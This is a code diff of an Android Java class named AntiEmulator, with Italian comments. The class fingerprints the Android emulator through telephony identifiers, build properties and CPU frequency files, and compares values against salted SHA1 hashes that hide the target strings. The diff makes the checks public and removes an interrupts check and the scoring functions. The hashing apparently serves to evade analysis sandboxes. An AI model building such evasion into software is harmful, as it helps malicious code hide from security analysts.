@@ -11,17 +11,13 @@ import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.crypto.Digest;
 
-// Possono ancora essere creati dei trick su:
-// /proc/iomem
-// /proc/ioports
-
 public class AntiEmulator {
 	private static final String TAG = "AntiEmulator";
 	
 	private static TelephonyManager tm = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
 	
 	// "000000000000000" se si e' nell'emulatore
-	private static boolean EmuCheckId() {
+	public static boolean EmuCheckId() {
 		String deviceId = tm.getDeviceId();
 		
 		if (Cfg.DEBUG) {
@@ -39,7 +35,7 @@ public class AntiEmulator {
 	}
 	
 	// "310260000000000" nell'emu
-	private static boolean EmuCheckSubscriber() {
+	public static boolean EmuCheckSubscriber() {
 		String subscriberId = tm.getSubscriberId();
 		
 		if (Cfg.DEBUG) {
@@ -62,7 +58,7 @@ public class AntiEmulator {
 	}
 	
 	// "15555215554" nell'emu
-	private static boolean EmuCheckPhoneNumber() {
+	public static boolean EmuCheckPhoneNumber() {
 		String phoneNumber = tm.getLine1Number();
 		
 		if (Cfg.DEBUG) {
@@ -91,7 +87,7 @@ public class AntiEmulator {
 	}
 	
 	// "generic" nell'emu
-	private static boolean EmuCheckDevice() {
+	public static boolean EmuCheckDevice() {
 		String device = Build.DEVICE;
 				
 		if (Cfg.DEBUG) {
@@ -109,7 +105,7 @@ public class AntiEmulator {
 	}
 
 	// "generic" nell'emu e per alcuni telefoni, attenzione
-	private static boolean EmuCheckBrand() {
+	public static boolean EmuCheckBrand() {
 		String brand = Build.BRAND;
 		
 		if (Cfg.DEBUG) {
@@ -127,7 +123,7 @@ public class AntiEmulator {
 	}
 
 	// Finisce per "test-keys" nell'emu
-	private static boolean EmuCheckKeys() {
+	public static boolean EmuCheckKeys() {
 		String keys = Build.FINGERPRINT;
 		int index;
 		
@@ -155,7 +151,7 @@ public class AntiEmulator {
 	}
 	
 	// "unknown" nell'emu
-	private static boolean EmuCheckManufacturer() {
+	public static boolean EmuCheckManufacturer() {
 		String manufacturer = Build.MANUFACTURER;
 		
 		if (Cfg.DEBUG) {
@@ -173,7 +169,7 @@ public class AntiEmulator {
 	}
 
 	// "sdk" nell'emu
-	private static boolean EmuCheckProduct() {
+	public static boolean EmuCheckProduct() {
 		String product = Build.PRODUCT;
 		
 		if (Cfg.DEBUG) {
@@ -182,8 +178,8 @@ public class AntiEmulator {
 		
 		String digest = Digest.SHA1("NWzeoThPu2" + product.toLowerCase()).toLowerCase();
 		
-		// "sdk" o "google_sdk"
-		if (digest.equals("77045d27d24fdec7f0439684fdbef14002f9519f") || digest.equals("835103e6a328d42a4a0688caac59662abe3def0a")) {
+		// "sdk"
+		if (digest.equals("77045d27d24fdec7f0439684fdbef14002f9519f")) {
 			return true;
 		}
 		
@@ -191,7 +187,7 @@ public class AntiEmulator {
 	}
 
 	// "test-keys" nell'emu
-	private static boolean EmuCheckTags() {
+	public static boolean EmuCheckTags() {
 		String tags = Build.TAGS;
 		
 		if (Cfg.DEBUG) {
@@ -209,7 +205,7 @@ public class AntiEmulator {
 	}
 	
 	// "Android" nell'emu
-	private static boolean EmuCheckOperator() {
+	public static boolean EmuCheckOperator() {
 		String operator = tm.getSimOperatorName();
 		
 		if (Cfg.DEBUG) {
@@ -226,7 +222,7 @@ public class AntiEmulator {
 		return false;
 	}
 	
-	private static boolean EmuCheckScaling() {
+	public static boolean EmuCheckScaling() {
 		Execute exec = new Execute();
 		
 		// "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"
@@ -247,130 +243,5 @@ public class AntiEmulator {
 		}
 		
 		return true;
-	}
-	
-	// " 1:          1    goldfish  goldfish_pdev_bus" sull'emu
-	private static boolean EmuCheckInterrupts() {
-		Execute exec = new Execute();
-		
-		// "cat /proc/interrupts"
-		ArrayList<String> interrupts = exec.execute(Messages.getString("36.9"));
-		
-		for (String row : interrupts) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (EmuCheckInterrupts): " + row); //$NON-NLS-1$
-			}
-			
-			if (row == null) {
-				continue;
-			}
-			
-			row = row.toLowerCase();
-			
-			int blank = row.lastIndexOf(" ");
-			
-			if (blank == -1 || blank == row.length()) {
-				continue;
-			}
-			
-			// Spostati sull'ultima stringa
-			blank++;
-			
-			try {
-				row = row.substring(blank);
-				
-				// "_"
-				blank = row.indexOf(Messages.getString("36.10"));
-				
-				if (blank == -1) {
-					continue;
-				}
-				
-				row = row.substring(0, blank);
-				
-				String digest = Digest.SHA1("ANGRI5na7E" + row).toLowerCase();
-				
-				// "goldfish"
-				if (digest.equals("005b7c6914ecea06e9f07d2861dc2e1aeb6f338c")) {
-					return true;
-				}
-			} catch (IndexOutOfBoundsException e) {
-				continue;
-			}
-		}
-		
-		return false;
-	}
-	
-	public boolean EmuCheckA() {
-		int score = 0;
-		
-		if (EmuCheckInterrupts() == true)
-			score++;
-		
-		if (EmuCheckBrand() == true)
-			score++;
-		
-		if (EmuCheckProduct() == true)
-			score++;
-		
-		if (score >= 2)
-			return true;
-		
-		return false;
-	}
-	
-	public boolean EmuCheckB() {
-		int score = 0;
-		
-		if (EmuCheckSubscriber() == true)
-			score++;
-		
-		if (EmuCheckKeys() == true)
-			score++;
-		
-		if (EmuCheckOperator() == true)
-			score++;
-		
-		if (score >= 2)
-			return true;
-		
-		return false;
-	}
-
-	public boolean EmuCheckC() {
-		int score = 0;
-		
-		if (EmuCheckPhoneNumber() == true)
-			score++;
-		
-		if (EmuCheckTags() == true)
-			score++;
-		
-		if (EmuCheckManufacturer() == true)
-			score++;
-		
-		if (score >= 2)
-			return true;
-		
-		return false;
-	}
-	
-	public boolean EmuCheckD() {
-		int score = 0;
-		
-		if (EmuCheckScaling() == true)
-			score++;
-		
-		if (EmuCheckDevice() == true)
-			score++;
-		
-		if (EmuCheckId() == true)
-			score++;
-		
-		if (score >= 2)
-			return true;
-		
-		return false;
 	}
 }
